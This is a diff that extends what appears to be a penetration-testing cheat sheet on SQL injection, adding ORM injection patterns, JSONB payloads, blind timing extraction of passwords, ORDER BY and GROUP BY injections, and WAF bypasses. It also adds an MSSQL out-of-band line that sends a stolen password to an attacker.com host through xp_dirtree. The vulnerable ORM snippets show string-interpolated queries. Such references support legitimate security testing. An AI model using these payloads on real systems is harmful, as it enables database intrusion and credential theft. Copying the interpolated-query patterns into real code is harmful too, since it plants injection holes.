@@ -296,6 +296,79 @@ sqlmap -u "https://target.com/login" --data="user=*&pass=test" --dbs
 sqlmap -u "https://target.com/?id=1" --tamper=space2comment,between --dbs
 ```
 
+## ORM Injection Points
+
+```javascript
+// Knex - orderByRaw/whereRaw
+db.orderByRaw(`created_at ${direction}`)
+db.whereRaw(`name = '${userInput}'`)
+
+// Sequelize literal
+Model.findAll({where: sequelize.literal(`role = '${role}'`)})
+```
+
+```python
+# Django extra()
+Model.objects.extra(where=[f"name = '{name}'"])
+
+# SQLAlchemy text()
+db.execute(text(f"SELECT * FROM users WHERE id = {id}"))
+```
+
+```ruby
+# Rails order injection
+User.order("#{params[:sort]} #{params[:dir]}")
+```
+
+## JSON/JSONB Operators
+
+```sql
+-- PostgreSQL JSONB
+' OR data->>'role' = 'admin' --
+' AND data @> '{"admin":true}' --
+
+-- PostgreSQL CTE blind extraction
+WITH x AS (SELECT data->>'password' as p FROM users WHERE id=1)
+SELECT CASE WHEN substring(p,1,1)='a' THEN pg_sleep(1) ELSE 1 END FROM x
+
+-- MySQL JSON
+JSON_EXTRACT(data, '$.role') = 'admin' OR 1=1--
+```
+
+## Uncommon Injection Points
+
+```sql
+-- ORDER BY boolean blind
+ORDER BY (CASE WHEN (1=1) THEN id ELSE name END)
+ORDER BY IF(1=1,id,name)
+
+-- GROUP BY injection
+GROUP BY (CASE WHEN (SELECT 1)=1 THEN id ELSE name END)
+
+-- LIMIT/OFFSET timing
+LIMIT 1 OFFSET (SELECT COUNT(*) FROM large_table)
+
+-- Full-text PostgreSQL
+to_tsquery('english', 'word & ' || user_input)
+```
+
+## WAF Bypass
+
+```sql
+-- Scientific notation
+1e0UNION SELECT
+
+-- Comment + newline
+SELECT--comment%0aSELECT * FROM users
+
+-- Null byte
+%00' OR 1=1--
+
+-- MSSQL OOB with variable
+DECLARE @d varchar(1024);SELECT @d=password FROM users WHERE id=1;
+EXEC('xp_dirtree ''\\'+@d+'.attacker.com\a''');
+```
+
 ---
 
 !!! tip "Test Order"
